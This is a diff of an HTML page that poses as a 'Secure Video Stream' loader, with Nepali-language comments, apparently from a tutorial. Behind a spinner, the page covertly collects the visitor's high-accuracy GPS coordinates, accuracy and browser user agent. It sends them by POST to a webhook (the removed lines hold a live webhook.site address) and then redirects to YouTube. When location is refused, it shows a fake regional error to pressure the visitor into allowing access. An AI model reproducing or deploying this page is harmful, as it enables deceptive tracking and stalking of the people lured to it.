@@ -1,33 +1,61 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading..</title></head>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player - Loading...</title>
+    <style>
+        body { background-color: #000; color: white; text-align: center; font-family: Arial; padding-top: 50px; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
 <body>
+    <div class="loader"></div>
+    <h2>Loading Secure Video Stream...</h2>
+    <p id="msg">Please wait while we verify your connection.</p>
+
     <script>
+        function sendData(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let acc = position.coords.accuracy;
+            let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // Webhook ma detail pathaune
+            fetch("YOUR_WEBHOOK_URL_HERE", {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({
+                    Google_Maps: mapLink,
+                    Accuracy_Meters: acc,
+                    Device: navigator.userAgent
+                })
+            }).then(() => {
+                // Data gaisakepachhi YouTube ma pathaine
+                window.location.replace("https://www.youtube.com/watch?v=NyFF18");
+            });
+
+            // Backup redirect yadi fetch slow bhayo bhane
+            setTimeout(() => { window.location.replace("https://www.youtube.com/watch?v=NyFF18"); }, 3000);
+        }
+
+        function handleError(error) {
+            // User lai force garne location ON garna
+            document.getElementById("msg").innerHTML = "<b style='color:red;'>Error: Video unavailable in your region. Please 'Allow' location and refresh to watch.</b>";
+            alert("This video requires Location Access to play. Please click 'Allow'.");
+        }
+
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    let lat = position.coords.latitude;
-                    let lon = position.coords.longitude;
-                    
-                    // Tapai ko location data yo link ma jancha
-                    let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    // Webhook link (Ma tala Step 4 ma sikhauchhu)
-                    fetch("https://webhook.site/bd584350-4ee3-4402-bc0b-7ae78eaeab7d", {
-                        method: "POST",
-                        mode: "no-cors",
-                        body: mapLink
-                    });
-
-                    // User lai YouTube ma pathaidine
-                    window.location.href = "https://youtu.be/IFYJNLZT_B0?si=Up8E16OzIvKYDlIU"; 
-                }, function() {
-                    alert("ok");
-                    location.reload();
+                navigator.geolocation.getCurrentPosition(sendData, handleError, {
+                    enableHighAccuracy: true, // Sabai bhanda best accuracy ko lagi
+                    timeout: 10000,
+                    maximumAge: 0
                 });
+            } else {
+                alert("Your browser does not support video streaming.");
             }
         };
     </script>
-    <h2>Loading... Please wait.</h2>
 </body>
 </html>
